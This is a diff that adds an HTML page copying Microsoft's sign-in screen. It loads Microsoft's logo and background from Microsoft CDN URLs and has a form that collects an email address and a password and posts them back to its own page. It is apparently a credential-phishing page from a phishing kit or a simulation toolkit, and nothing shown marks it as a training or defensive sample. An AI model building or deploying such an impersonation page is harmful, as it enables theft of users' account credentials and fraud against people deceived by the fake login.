@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="en">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>Sign in to your account</title>
+<style>
+
+html{  
+    background: url(https://logincdn.msauth.net/16.000.28725.5/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg) no-repeat center center fixed; 
+    -webkit-background-size: cover;
+    -moz-background-size: cover;
+    -o-background-size: cover;
+    background-size: cover;
+}
+    
+.img {
+        display: grid;
+        height: 100%;
+        max-width: 100%;
+        max-height: 100%;
+        margin: auto;
+}
+    
+.box {
+  position: absolute;
+  width: 350px;
+  height: 250px;
+  border: 1px solid #A9A9A9;  
+  background-color: white;
+  padding: 10px;
+  line-height: 1.75rem;
+  font-weight: 600;
+  font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math"
+}
+
+    
+.centered {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  
+}
+
+
+.marg {
+    margin-left: 20px;
+    margin-top: 10px;
+}
+    
+input {
+  border: 0;
+  outline: 0;
+  background: transparent;
+  width: 300px;
+  border-bottom: .75px solid gray;
+}
+
+.myButton {
+    margin-left: 200px;
+	background-color:#006cbf;
+	display:inline-block;
+	cursor:pointer;
+	color:#ffffff;
+	font-family:Arial;
+	font-size:17px;
+	padding:7px 33px;
+	text-decoration:none;
+	&:hover {
+	background-color:#0061a7;
+}
+ &:active {
+	position:relative;
+	top:1px;
+}
+ }
+
+input[type=submit] {    
+    width: 125px;
+    margin-left: 200px;
+	background-color:#006cbf;
+	display:inline-block;
+	cursor:pointer;
+	color:#ffffff;
+	font-family:Arial;
+	font-size:17px;
+	padding:7px 1px;
+	text-decoration:none;
+    line-height: 1.75rem;
+    font-weight: 600;
+    font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math"
+	&:hover {
+	background-color:#0061a7;}
+
+ &:active {
+	position:relative;
+	top:1px;
+}
+}
+
+</style> 
+</head>
+
+<body>
+<form action="" method="post" name="signIn" novalidate="">
+    
+ <div>
+ 
+    <div class="centered box">
+        <p class="marg"><img src="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="MS Logo" height="25" width="95"></p>
+        <p class="marg" style="font-size: 1.5rem">Sign in</p>
+        
+        <!-- INPUT/Data Fields -->
+        <!-- params: email_address & password -->
+        <p><input class="marg" alt="Email" name="email_address" placeholder="Email, phone, Skype"></p>
+        <p><input type=password class="marg" alt="Passwprd" name="password" placeholder="Password" style="border-lenth:20px"></p>
+        
+        <!-- SUBMIT Button -->
+        <input type="submit" name="submit" value="Submit"/>
+        
+        
+        <!-- Old SUBMIT Button 
+        <a href="#" class="myButton">Submit</a> -->
+    </div>
+
+</div>
+
+</form>
+ 
+</body>
+</html> 
